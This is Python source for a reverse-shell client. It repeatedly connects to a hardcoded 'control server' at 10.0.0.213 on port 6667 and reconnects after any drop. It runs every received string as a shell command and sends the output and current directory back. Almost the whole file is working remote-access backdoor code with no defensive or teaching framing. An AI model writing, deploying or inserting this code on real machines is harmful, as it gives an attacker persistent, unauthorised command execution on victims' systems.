import os
import socket
import subprocess
import sys
from os.path import expanduser
from time import sleep


class Client(object):
    def __init__(self, host='', port=6667):
        self.host = host
        self.port = port
        self.connected = False
        self.sock = self._connect_to_server()

    def _connect_to_server(self):
        """
        Ping the control server until it accepts the connection.

        :return:
        """

        self.sock = False
        self.connected = False

        # Loop until the connection is successful.
        while True:
            self.sock = socket.socket()
            try:
                self.sock.connect((self.host, self.port))
                self.connected = True
                print('Connected to server...')
                break
            except socket.error as the_error_message:
                print('Waiting for control server {}:{} {}'.format(self.host, self.port, the_error_message))
                sleep(5)

        return self.sock

    def _send_output_with_cwd(self, some_data):
        """
        Send something back to the control server with the current
        working directory appended to the end of it.

        :param some_data:
        :return:
        """

        self.sock.send(str.encode(some_data + str(os.getcwd()) + '>' + '~!_TERM_%~'))
        return self

    def main(self):
        # If we have a socket, then proceed to receive commands.
        if self.sock:
            while True:
                try:
                    data = self.sock.recv(1024)
                except socket.error as error_message:
                    print('Server closed connection:', error_message)
                    self.sock.close()
                    self.sock = self._connect_to_server()
                    continue

                # Continue looping if there is no data.
                if len(data) < 1:
                    continue

                if data.decode('utf-8')[:15] == 'single_command-':
                    d = data.decode('utf-8')[15:]
                    if d == 'get_platform':
                        self.sock.send(str.encode(sys.platform + '~!_TERM_%~'))
                        continue
                    elif d == 'getcwd':
                        self._send_output_with_cwd('')
                        continue

                if data.decode('utf-8') == 'quit':
                    # The control server is shutting down, so we should shutdown
                    # then start trying to reconnect for the next session.
                    self.sock.close()
                    print('Control server disconnected...')
                    print('Waiting for server...')
                    self.sock = self._connect_to_server()
                    continue

                # Handle the cd command.
                if data[:2].decode('utf-8') == 'cd':
                    try:
                        _dir = data[3:].decode('utf-8')

                        # Cross platform cd to ~/
                        if _dir[:2] == '~/':
                            # shorten variable name and function name for the next 1 liner.
                            p, expusr = sys.platform, expanduser
                            # Get the full path.
                            _dir = expusr('~') + '/' + _dir[2:] if p != 'win32' else expanduser('~') + '\\' + _dir[2:]
                            p, expurs = None, None
                            del p
                            del expurs

                        # Change the directory
                        os.chdir(_dir)
                        self._send_output_with_cwd('')
                        continue
                    except Exception as err_msg:
                        err_msg = str(err_msg)
                        self._send_output_with_cwd(err_msg + "\n")
                        continue

                # Process the command.
                cmd = subprocess.Popen(
                    data[:].decode('utf-8'),
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )

                # Compile the output.
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, 'utf-8')

                # Send the output back to control server.
                self._send_output_with_cwd(output_str)


if __name__ == '__main__':
    c = Client(host='10.0.0.213', port=6667)
    c.main()
